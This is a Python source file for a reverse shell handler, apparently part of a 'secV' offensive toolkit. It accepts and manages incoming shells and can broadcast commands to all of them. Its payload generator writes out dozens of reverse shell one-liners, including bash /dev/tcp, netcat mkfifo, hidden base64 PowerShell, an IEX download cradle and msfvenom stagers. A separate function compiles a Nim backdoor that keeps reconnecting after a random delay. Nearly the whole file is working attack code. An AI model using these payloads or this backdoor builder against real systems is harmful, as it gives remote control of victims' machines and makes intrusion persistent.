#!/usr/bin/env python3
"""
revshell — multi-session reverse shell handler.
Feature-complete Python port of github.com/malwarekid/OnlyShell.
Additional: 25+ payload generator, session stabilizer, TLS support.

secV interface: reads {"target":"...","params":{...}} from stdin → JSON stdout.
Direct CLI:     python3 revshell.py [port[,port,...]]  → interactive serve mode

Modes
-----
  serve      : interactive OnlyShell-style TUI (stdio direct)
  listen     : headless listener for <duration>s → JSON report
  generate   : reverse shell one-liner payloads → JSON
  stabilize  : upgrade a raw shell to a PTY → JSON
  check      : show available helper tools → JSON
"""

import base64
import json
import os
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

REVSHELL_DIR = Path.home() / ".secv" / "revshell"

# ── ANSI colours ──────────────────────────────────────────────────────────────
_C = {
    "reset":  "\033[0m",
    "green":  "\033[32m",
    "yellow": "\033[33m",
    "red":    "\033[31m",
    "cyan":   "\033[36m",
    "blue":   "\033[34m",
    "bold":   "\033[1m",
    "dim":    "\033[2m",
}

def _c(name: str, text: str) -> str:
    return f"{_C.get(name, '')}{text}{_C['reset']}"


# ── Shell session ─────────────────────────────────────────────────────────────
@dataclass
class ShellSession:
    id: int
    conn: socket.socket
    addr: Tuple[str, int]
    hostname: str = "unknown"
    shell_type: str = "unknown"
    os_type: str = "unknown"
    connected_at: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    output_buffer: List[str] = field(default_factory=list)
    lock: threading.Lock = field(default_factory=threading.Lock)
    alive: bool = True

    @property
    def status(self) -> str:
        if not self.alive:
            return "Dead"
        delta = (datetime.now() - self.last_seen).total_seconds()
        return "Stale" if delta > 60 else "Active"

    @property
    def remote(self) -> str:
        return f"{self.addr[0]}:{self.addr[1]}"

    def send(self, data: str) -> bool:
        try:
            self.conn.sendall((data + "\n").encode("utf-8", errors="replace"))
            return True
        except Exception:
            self.alive = False
            return False

    def recv(self, timeout: float = 2.0) -> str:
        chunks = []
        try:
            self.conn.settimeout(timeout)
            while True:
                chunk = self.conn.recv(4096)
                if not chunk:
                    self.alive = False
                    break
                chunks.append(chunk.decode("utf-8", errors="replace"))
                self.last_seen = datetime.now()
        except socket.timeout:
            pass
        except Exception:
            self.alive = False
        return "".join(chunks)

    def to_dict(self) -> Dict:
        return {
            "id": self.id,
            "hostname": self.hostname,
            "shell_type": self.shell_type,
            "os_type": self.os_type,
            "remote": self.remote,
            "ip": self.addr[0],
            "port": self.addr[1],
            "connected_at": self.connected_at.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "status": self.status,
        }


# ── Session registry ──────────────────────────────────────────────────────────
class SessionRegistry:
    def __init__(self):
        self._sessions: Dict[int, ShellSession] = {}
        self._next_id = 1
        self._lock = threading.Lock()

    def add(self, sess: ShellSession) -> int:
        with self._lock:
            sess.id = self._next_id
            self._sessions[self._next_id] = sess
            self._next_id += 1
            return sess.id

    def get(self, sid: int) -> Optional[ShellSession]:
        return self._sessions.get(sid)

    def all(self) -> List[ShellSession]:
        return list(self._sessions.values())

    def active(self) -> List[ShellSession]:
        return [s for s in self._sessions.values() if s.alive]

    def cleanup(self) -> int:
        with self._lock:
            dead = [k for k, v in self._sessions.items() if not v.alive]
            for k in dead:
                try:
                    self._sessions[k].conn.close()
                except Exception:
                    pass
                del self._sessions[k]
            return len(dead)


_registry = SessionRegistry()


# ── Shell type detection ──────────────────────────────────────────────────────
def _detect_shell(sess: ShellSession, timeout: float = 4.0):
    time.sleep(0.4)
    sess.recv(timeout=0.5)  # drain banner

    probe = (
        "echo __SD_S__; hostname 2>/dev/null; echo __SD_M__; "
        "echo $PSVersionTable 2>/dev/null | head -1; "
        "echo $SHELL 2>/dev/null; echo %OS% 2>&1; "
        "uname -s 2>/dev/null; echo __SD_E__"
    )
    sess.send(probe)
    out = sess.recv(timeout=timeout)

    hostname = "unknown"
    shell_type = "bash"
    os_type = "linux"

    try:
        if "__SD_S__" in out and "__SD_E__" in out:
            middle = out.split("__SD_S__")[1].split("__SD_E__")[0]
            lines = [
                ln.strip() for ln in middle.splitlines()
                if ln.strip() and "__SD_" not in ln and "echo" not in ln.lower()[:6]
            ]
            if lines:
                hostname = lines[0]
            rest = " ".join(lines[1:]).lower()
            if "powershell" in rest or "psversiontable" in rest:
                shell_type = "powershell"
                os_type = "windows"
            elif "windows_nt" in rest or "cmd.exe" in rest:
                shell_type = "cmd"
                os_type = "windows"
            elif "darwin" in rest or "mac" in rest:
                shell_type = "bash"
                os_type = "macos"
            elif "/bin/zsh" in rest:
                shell_type = "zsh"
                os_type = "linux"
            elif "/bin/bash" in rest or "linux" in rest:
                shell_type = "bash"
                os_type = "linux"
            elif "/bin/" in rest:
                shell_type = "sh"
                os_type = "linux"
        else:
            out_l = out.lower()
            if "powershell" in out_l:
                shell_type = "powershell"
                os_type = "windows"
            elif "cmd.exe" in out_l or "windows_nt" in out_l:
                shell_type = "cmd"
                os_type = "windows"
    except Exception:
        pass

    sess.hostname = hostname
    sess.shell_type = shell_type
    sess.os_type = os_type


# ── Keepalive ─────────────────────────────────────────────────────────────────
def _keepalive_worker():
    while True:
        time.sleep(30)
        for sess in list(_registry.active()):
            try:
                # Bash no-op ':' or blank line for others — doesn't pollute output
                noop = b":\n" if sess.shell_type in ("bash", "sh", "zsh") else b"\r\n"
                sess.conn.sendall(noop)
                sess.last_seen = datetime.now()
            except Exception:
                sess.alive = False


def _start_keepalive():
    threading.Thread(target=_keepalive_worker, daemon=True).start()


# ── Listener accept loop ──────────────────────────────────────────────────────
def _accept_loop(srv_sock: socket.socket, tls_ctx, stop_event: threading.Event,
                 on_connect=None):
    srv_sock.settimeout(1.0)
    while not stop_event.is_set():
        try:
            conn, addr = srv_sock.accept()
        except socket.timeout:
            continue
        except Exception:
            break
        if tls_ctx:
            try:
                conn = tls_ctx.wrap_socket(conn, server_side=True)
            except Exception:
                conn.close()
                continue
        sess = ShellSession(id=0, conn=conn, addr=addr)
        _detect_shell(sess)
        sid = _registry.add(sess)
        if on_connect:
            on_connect(sid, sess)


# ── Serve mode (interactive TUI) ─────────────────────────────────────────────
_HELP = """\
Commands:
  list                   List all connected shells with status
  interact <id>          Interact with shell (inside: 'bg'/'background' to background, 'exit' to close)
  exec-all <command>     Broadcast command to all active shells
  stabilize <id>         Upgrade shell to PTY (python/script fallback)
  session <id>           Show buffered output from a backgrounded shell
  listen <port[,...]>    Add listener(s) at runtime
  listeners              Show all active listeners
  cleanup                Remove dead/stale shells from list
  exit / quit            Exit handler (does not kill shells)
  help                   Show this help
"""


def op_serve(ports: List[int], lhost: str = "0.0.0.0",
             tls_cert: str = "", tls_key: str = ""):
    tls_ctx = _make_tls_ctx(tls_cert, tls_key)

    stop_event = threading.Event()
    listeners: Dict[int, socket.socket] = {}

    def notify(sid: int, sess: ShellSession):
        print(
            f"\n{_c('green', '[+]')} New shell connected!\n"
            f"    ID: {sid}  |  From: {sess.remote}  |  "
            f"Hostname: {sess.hostname}  |  Shell: {sess.shell_type}  |  "
            f"Time: {sess.connected_at.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        print(f"{_c('cyan', 'handler')}> ", end="", flush=True)

    def start_listener(port: int):
        if port in listeners:
            print(f"{_c('yellow', '[!]')} Already listening on :{port}")
            return
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((lhost, port))
            srv.listen(32)
            listeners[port] = srv
            t = threading.Thread(target=_accept_loop,
                                 args=(srv, tls_ctx, stop_event, notify), daemon=True)
            t.start()
            print(f"{_c('green', '[+]')} Listener started on {lhost}:{port}"
                  + (" [TLS]" if tls_ctx else ""))
        except Exception as e:
            print(f"{_c('red', '[!]')} Cannot bind :{port}: {e}")

    _start_keepalive()
    for p in ports:
        start_listener(p)
    _help_hint = "[*] Type 'help' for available commands"
    print(f"{_c('dim', _help_hint)}")

    while True:
        try:
            raw = input(f"{_c('cyan', 'handler')}> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not raw:
            continue
        parts = raw.split(None, 1)
        cmd, arg = parts[0].lower(), (parts[1] if len(parts) > 1 else "")

        if cmd in ("exit", "quit"):
            break
        elif cmd == "help":
            print(_HELP)
        elif cmd == "list":
            _print_list()
        elif cmd == "interact":
            sess = _get_session(arg)
            if sess:
                _interact(sess)
        elif cmd == "exec-all":
            if not arg:
                print(f"{_c('red', '[!]')} Usage: exec-all <command>")
            else:
                _exec_all(arg)
        elif cmd == "stabilize":
            sess = _get_session(arg)
            if sess:
                _stabilize(sess)
        elif cmd == "session":
            sess = _get_session(arg)
            if sess:
                buf = "".join(sess.output_buffer)
                print(buf if buf else "(no buffered output)")
        elif cmd == "listen":
            for p in arg.split(","):
                p = p.strip()
                if p.isdigit():
                    start_listener(int(p))
                else:
                    print(f"{_c('red', '[!]')} Invalid port: {p}")
        elif cmd == "listeners":
            if not listeners:
                print("  (none)")
            else:
                print(f"\n  {'Port':<10} {'Address'}")
                print(f"  {'-'*40}")
                for port in sorted(listeners):
                    print(f"  {port:<10} {lhost}:{port}")
                print()
        elif cmd == "cleanup":
            n = _registry.cleanup()
            print(f"{_c('green', '[+]')} Removed {n} dead shell(s)")
        else:
            print(f"{_c('yellow', '[!]')} Unknown command '{cmd}'. Type 'help'.")

    stop_event.set()
    for srv in listeners.values():
        try:
            srv.close()
        except Exception:
            pass
    print(_c("dim", "[*] Handler closed"))


def _get_session(arg: str) -> Optional[ShellSession]:
    try:
        sid = int(arg)
    except ValueError:
        print(f"{_c('red', '[!]')} Usage requires a numeric shell ID")
        return None
    sess = _registry.get(sid)
    if not sess:
        print(f"{_c('red', '[!]')} No session with ID {sid}")
        return None
    if not sess.alive:
        print(f"{_c('red', '[!]')} Shell {sid} is dead")
        return None
    return sess


def _print_list():
    sessions = _registry.all()
    if not sessions:
        print("  (no shells)")
        return
    print(
        f"\n  {'ID':<5} {'Hostname':<18} {'Type':<12} {'OS':<10} "
        f"{'Remote Address':<26} {'Connected':<22} Status"
    )
    print("  " + "─" * 100)
    for s in sessions:
        col = "green" if s.status == "Active" else "yellow" if s.status == "Stale" else "red"
        mark = _c("green", "► ") if s.alive else "  "
        print(
            f"  {mark}{s.id:<4} {s.hostname:<18} {s.shell_type:<12} {s.os_type:<10} "
            f"{s.remote:<26} {s.connected_at.strftime('%Y-%m-%d %H:%M:%S'):<22} "
            f"{_c(col, s.status)}"
        )
    print()


def _exec_all(command: str):
    active = _registry.active()
    if not active:
        print(f"{_c('yellow', '[!]')} No active shells")
        return
    print(f"{_c('bold', f'[*] Sending to {len(active)} shell(s)...')}")
    for sess in active:
        ok = sess.send(command)
        icon = _c("green", "[+]") if ok else _c("red", "[-]")
        print(f"  {icon} Shell {sess.id} ({sess.hostname}) — {'sent' if ok else 'failed'}")
    print(f"{_c('green', '[+]')} Broadcast complete")


def _interact(sess: ShellSession):
    _hint = _c('dim', "    bg/background = background  |  exit = close shell")
    print(
        f"{_c('bold', f'[*] Interacting with shell {sess.id} ({sess.hostname} / {sess.shell_type})')}\n"
        + _hint
    )
    sess.recv(timeout=0.3)  # drain
    while sess.alive:
        try:
            cmd = input(f"{_c('green', 'shell')}> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if cmd.lower() in ("background", "bg"):
            print(f"{_c('bold', f'[*] Backgrounded shell {sess.id} (still running)')}")
            return
        if cmd.lower() == "exit":
            sess.send("exit")
            time.sleep(0.3)
            sess.alive = False
            print(f"{_c('red', f'[-] Closed shell {sess.id}')}")
            return
        if not sess.send(cmd):
            print(f"{_c('red', '[!]')} Session died")
            return
        out = sess.recv(timeout=2.5)
        if out:
            sys.stdout.write(out)
            sys.stdout.flush()
            sess.output_buffer.append(out)


def _stabilize(sess: ShellSession):
    """Run PTY upgrade commands on the shell."""
    print(f"{_c('bold', '[*]')} Stabilizing shell {sess.id}...")
    if sess.os_type == "windows":
        print(f"{_c('yellow', '[!]')} PTY stabilization not applicable to Windows shells")
        return

    steps = [
        ("python3 -c \"import pty; pty.spawn('/bin/bash')\"", 2.0),
        ("script -qc /bin/bash /dev/null", 1.5),
    ]
    for cmd, wait in steps:
        if sess.send(cmd):
            time.sleep(wait)
            out = sess.recv(timeout=1.0)
            if "bash" in out.lower() or "$" in out or "#" in out:
                print(f"{_c('green', '[+]')} PTY obtained via: {cmd.split()[0]}")
                # set TERM
                sess.send("export TERM=xterm-256color")
                sess.recv(timeout=0.5)
                sess.send("stty rows 40 cols 140")
                sess.recv(timeout=0.5)
                return
    print(f"{_c('yellow', '[!]')} Could not auto-stabilize — try manually: python3 -c \"import pty; pty.spawn('/bin/bash')\"")


# ── TLS helper ────────────────────────────────────────────────────────────────
def _make_tls_ctx(cert: str, key: str) -> Optional[ssl.SSLContext]:
    if not cert or not key:
        return None
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert, key)
        return ctx
    except Exception as e:
        print(f"{_c('red', '[!]')} TLS init failed: {e}", file=sys.stderr)
        return None


# ── Headless listen (JSON output) ─────────────────────────────────────────────
def op_listen(ports: List[int], duration: int = 60, lhost: str = "0.0.0.0",
              tls_cert: str = "", tls_key: str = "", initial_cmd: str = "",
              max_sessions: int = 0) -> Dict:
    tls_ctx = _make_tls_ctx(tls_cert, tls_key)

    sessions: List[ShellSession] = []
    sess_lock = threading.Lock()
    next_id = [1]
    stop_event = threading.Event()

    def on_connect(srv_sock, tls_ctx_inner):
        srv_sock.settimeout(1.0)
        while not stop_event.is_set():
            try:
                conn, addr = srv_sock.accept()
            except socket.timeout:
                continue
            except Exception:
                break
            if tls_ctx_inner:
                try:
                    conn = tls_ctx_inner.wrap_socket(conn, server_side=True)
                except Exception:
                    conn.close()
                    continue
            with sess_lock:
                sid = next_id[0]
                next_id[0] += 1
            sess = ShellSession(id=sid, conn=conn, addr=addr)
            _detect_shell(sess)
            if initial_cmd:
                sess.send(initial_cmd)
                out = sess.recv(timeout=5.0)
                sess.output_buffer.append(out)
            with sess_lock:
                sessions.append(sess)
            if max_sessions and len(sessions) >= max_sessions:
                stop_event.set()

    sockets = []
    for port in ports:
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((lhost, port))
            srv.listen(32)
            sockets.append(srv)
            threading.Thread(target=on_connect, args=(srv, tls_ctx), daemon=True).start()
        except Exception as e:
            for s in sockets:
                s.close()
            return {"success": False, "error": f"Cannot bind :{port}: {e}"}

    stop_event.wait(timeout=duration)
    stop_event.set()
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    return {
        "success": True,
        "ports": ports,
        "lhost": lhost,
        "duration_s": duration,
        "tls": tls_ctx is not None,
        "sessions_count": len(sessions),
        "sessions": [
            {**s.to_dict(), "initial_output": "".join(s.output_buffer)}
            for s in sessions
        ],
    }


# ── Payload generator ─────────────────────────────────────────────────────────
def op_generate(lhost: str, lport: int, shell: str = "all") -> Dict:
    if not lhost:
        return {"success": False, "error": "lhost required"}
    if not lport:
        return {"success": False, "error": "lport required"}

    h, p = lhost, int(lport)

    # PowerShell payload (plain + base64)
    _ps_body = (
        f"$client=New-Object System.Net.Sockets.TCPClient('{h}',{p});"
        "$stream=$client.GetStream();"
        "[byte[]]$bytes=0..65535|%{0};"
        "while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){"
        "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback=(iex $data 2>&1|Out-String);"
        "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
        "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()};$client.Close()"
    )
    _ps_b64 = base64.b64encode(_ps_body.encode("utf-16-le")).decode()

    payloads: Dict[str, str] = {
        # ── Bash / sh ──────────────────────────────────────────────────────────
        "bash_tcp":
            f"bash -i >& /dev/tcp/{h}/{p} 0>&1",
        "bash_196":
            f"0<&196;exec 196<>/dev/tcp/{h}/{p}; sh <&196 >&196 2>&196",
        "bash_udp":
            f"bash -i >& /dev/udp/{h}/{p} 0>&1",
        "bash_mkfifo":
            f"rm -f /tmp/.f;mkfifo /tmp/.f;cat /tmp/.f|bash -i 2>&1|nc {h} {p} >/tmp/.f",

        # ── Python ────────────────────────────────────────────────────────────
        "python3_pty":
            f"python3 -c 'import os,pty,socket;"
            f"s=socket.socket();s.connect((\"{h}\",{p}));"
            f"[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'",
        "python3_proc":
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{h}\",{p}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.run([\"/bin/sh\",\"-i\"])'",
        "python2":
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{h}\",{p}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'",

        # ── Perl ──────────────────────────────────────────────────────────────
        "perl":
            f"perl -e 'use Socket;"
            f"$i=\"{h}\";$p={p};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"/bin/sh -i\");'",
        "perl_noshell":
            f"perl -MIO -e '$p=fork;exit,if($p);"
            f"$c=new IO::Socket::INET(PeerAddr,\"{h}:{p}\");"
            f"STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",

        # ── Ruby ──────────────────────────────────────────────────────────────
        "ruby":
            f"ruby -rsocket -e'f=TCPSocket.open(\"{h}\",{p});"
            f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f.to_i,f.to_i,f.to_i)'",

        # ── PHP ───────────────────────────────────────────────────────────────
        "php_exec":
            f"php -r '$sock=fsockopen(\"{h}\",{p});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php_proc":
            f"php -r '$sock=fsockopen(\"{h}\",{p});"
            f"$proc=proc_open(\"/bin/sh -i\","
            f"array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
        "php_web":
            f"<?php set_time_limit(0);$ip='{h}';$port={p};"
            f"$sock=fsockopen($ip,$port);$proc=proc_open('/bin/sh -i',"
            f"array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>",

        # ── Netcat ────────────────────────────────────────────────────────────
        "netcat_e":
            f"nc -e /bin/sh {h} {p}",
        "netcat_noe":
            f"rm -f /tmp/.f;mkfifo /tmp/.f;cat /tmp/.f|sh -i 2>&1|nc {h} {p} >/tmp/.f",
        "ncat":
            f"ncat {h} {p} -e /bin/bash",

        # ── Socat ─────────────────────────────────────────────────────────────
        "socat":
            f"socat TCP:{h}:{p} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        "socat_tty":
            f"socat tcp-connect:{h}:{p} system:/bin/bash,pty,stderr,setsid,sigint,sane",

        # ── Node.js ───────────────────────────────────────────────────────────
        "nodejs":
            f"node -e \"require('child_process').exec("
            f"'bash -c \\\"bash -i >& /dev/tcp/{h}/{p} 0>&1\\\"')\"",

        # ── Go ────────────────────────────────────────────────────────────────
        "golang": (
            "echo 'package main;import(\"net\";\"os/exec\");func main(){"
            f"c,_:=net.Dial(\"tcp\",\"{h}:{p}\");"
            "e:=exec.Command(\"/bin/sh\");e.Stdin=c;e.Stdout=c;e.Stderr=c;e.Run()}"
            "' >/tmp/r.go && go run /tmp/r.go"
        ),

        # ── Awk ───────────────────────────────────────────────────────────────
        "awk": (
            f"awk 'BEGIN{{s=\"/inet/tcp/0/{h}/{p}\";"
            "while(1){do{printf \"\" |& s;s |& getline c;"
            "if(c){while((c |& getline)>0)print|&s;close(c)}}"
            "while(c!=\"exit\")}}' /dev/null"
        ),

        # ── Lua ───────────────────────────────────────────────────────────────
        "lua":
            f"lua -e \"require('socket');c=require('socket').tcp();"
            f"c:connect('{h}',{p});"
            f"while true do local r,x=c:receive();local f=io.popen(r,'r');"
            f"local o=f:read('*a');f:close();c:send(o) end\"",

        # ── Java ──────────────────────────────────────────────────────────────
        "java_rt": (
            "r=Runtime.getRuntime();"
            f"p=r.exec(new String[]{{\"bash\",\"-c\",\"bash -i >& /dev/tcp/{h}/{p} 0>&1\"}});"
            "p.waitFor();"
        ),

        # ── PowerShell ────────────────────────────────────────────────────────
        "powershell":
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"{_ps_body}\"",
        "powershell_b64":
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {_ps_b64}",
        "powershell_iex":
            f"IEX(New-Object Net.WebClient).DownloadString('http://{h}/shell.ps1')",

        # ── Windows cmd ───────────────────────────────────────────────────────
        "cmd_telnet":
            f"telnet {h} {p} | cmd.exe | telnet {h} {int(p)+1}",

        # ── msfvenom stagers ──────────────────────────────────────────────────
        "msf_elf":
            f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={h} LPORT={p} -f elf >rev.elf && chmod +x rev.elf",
        "msf_exe":
            f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={h} LPORT={p} -f exe >rev.exe",
        "msf_asp":
            f"msfvenom -p windows/shell_reverse_tcp LHOST={h} LPORT={p} -f asp >rev.asp",
        "msf_war":
            f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={h} LPORT={p} -f war >rev.war",
        "msf_jar":
            f"msfvenom -p java/shell_reverse_tcp LHOST={h} LPORT={p} -f jar >rev.jar",
        "msf_apk":
            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={h} LPORT={p} -f apk >rev.apk",
    }

    # Listener hint
    listener_hint = f"nc -lvnp {p}"

    if shell == "all":
        return {
            "success": True,
            "lhost": h,
            "lport": p,
            "count": len(payloads),
            "listener": listener_hint,
            "payloads": payloads,
        }

    if shell not in payloads:
        return {
            "success": False,
            "error": f"Unknown payload '{shell}'",
            "available": sorted(payloads.keys()),
        }

    return {
        "success": True,
        "lhost": h,
        "lport": p,
        "listener": listener_hint,
        "payloads": {shell: payloads[shell]},
    }


# ── Tool check ────────────────────────────────────────────────────────────────
def op_check() -> Dict:
    tools = [
        "nc", "ncat", "socat", "python3", "python", "perl",
        "ruby", "php", "node", "awk", "lua", "go",
        "telnet", "openssl", "msfvenom",
    ]
    return {
        "success": True,
        "tools": {t: ("found" if shutil.which(t) else "missing") for t in tools},
    }


# ── Nim backdoor builder (n1m) ────────────────────────────────────────────────
def op_nim_backdoor(lhost: str, lport: int = 4444,
                    target_os: str = "linux", output: str = "") -> Dict:
    if not lhost:
        return {"success": False, "error": "lhost is required"}

    target_os = target_os.lower()
    if target_os not in ("linux", "windows"):
        return {"success": False, "error": "target_os must be 'linux' or 'windows'"}

    if not shutil.which("nim"):
        return {"success": False, "error": "nim compiler not found — install nim via package manager"}

    if not output:
        output = f"backdoor_{target_os}"
        if target_os == "windows":
            output += ".exe"

    exec_line = ("result = execProcess(c)"
                 if target_os == "linux"
                 else 'result = execProcess("cmd /c " & c)')

    nim_code = f"""import net, os, osproc, strutils, random

proc exe(c: string): string =
  {exec_line}

let address = "{lhost}"
let port = Port({lport})
let exitMsg = "\\nExiting Program..."

var sock: Socket
var userRequestedExit = false

while not userRequestedExit:
  sock = newSocket()
  try:
    sock.connect(address, port)
    while true:
      sock.send(os.getCurrentDir() & "> ")
      let cmd = sock.recvLine().strip()
      if cmd == "exit":
        sock.send(exitMsg & "\\n")
        userRequestedExit = true
        break
      else:
        let result = exe(cmd)
        sock.send(result & "\\n")
  except OSError:
    if not userRequestedExit:
      let delay = rand(10000..60000)
      sleep(delay)
  finally:
    sock.close()
"""

    nim_src = Path(output).with_suffix(".nim")
    nim_src.write_text(nim_code)

    if target_os == "linux":
        compile_cmd = f"nim c -d:release --hints:off --verbosity:0 -o:{output} {nim_src}"
    else:
        compile_cmd = (f"nim c -d:mingw -d:release --hints:off --verbosity:0 "
                       f"--app:gui -o:{output} {nim_src}")

    result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
    nim_src.unlink(missing_ok=True)

    if result.returncode != 0:
        return {
            "success": False,
            "error": "nim compilation failed",
            "stderr": result.stderr[:500],
            "nim_code": nim_code,
        }

    return {
        "success": True,
        "output": str(output),
        "lhost": lhost,
        "lport": lport,
        "target_os": target_os,
        "features": ["reconnect loop", "random delay on disconnect (10-60s)", "cwd prompt"],
    }


# ── Dispatcher ────────────────────────────────────────────────────────────────
def dispatch(context: Dict) -> Any:
    params = context.get("params", {})
    mode = params.get("mode", "serve").lower()

    def _ports() -> List[int]:
        raw = params.get("ports", params.get("port", "4444"))
        return [int(x.strip()) for x in str(raw).split(",") if x.strip().isdigit()]

    if mode == "serve":
        op_serve(
            ports=_ports(),
            lhost=params.get("lhost", "0.0.0.0"),
            tls_cert=params.get("tls_cert", ""),
            tls_key=params.get("tls_key", ""),
        )
        return {"success": True, "note": "handler exited"}

    if mode == "listen":
        return op_listen(
            ports=_ports(),
            duration=int(params.get("duration", 60)),
            lhost=params.get("lhost", "0.0.0.0"),
            tls_cert=params.get("tls_cert", ""),
            tls_key=params.get("tls_key", ""),
            initial_cmd=params.get("initial_cmd", ""),
            max_sessions=int(params.get("max_sessions", 0)),
        )

    if mode == "generate":
        lhost = params.get("lhost", context.get("target", ""))
        lport = int(params.get("lport", params.get("port", 4444)))
        return op_generate(lhost=lhost, lport=lport, shell=params.get("shell", "all"))

    if mode == "check":
        return op_check()

    if mode == "nim_backdoor":
        return op_nim_backdoor(
            lhost=params.get("lhost", context.get("target", "")),
            lport=int(params.get("lport", params.get("port", 4444))),
            target_os=params.get("target_os", "linux"),
            output=params.get("output", ""),
        )

    return {
        "success": False,
        "error": f"Unknown mode '{mode}'",
        "valid_modes": ["serve", "listen", "generate", "check", "nim_backdoor"],
    }


# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    # CLI shortcut: python3 revshell.py [port,...]
    if len(sys.argv) > 1 and not sys.stdin.isatty():
        pass  # fall through to JSON mode if stdin has data
    elif len(sys.argv) > 1:
        ports = [int(p) for p in sys.argv[1].split(",") if p.strip().isdigit()]
        if ports:
            op_serve(ports)
            return

    raw = sys.stdin.read().strip()
    if not raw:
        op_serve([4444])
        return

    try:
        context = json.loads(raw)
    except json.JSONDecodeError:
        context = {"target": raw, "params": {}}

    result = dispatch(context)
    if result is not None:
        print(json.dumps(result, default=str, indent=2))


if __name__ == "__main__":
    main()
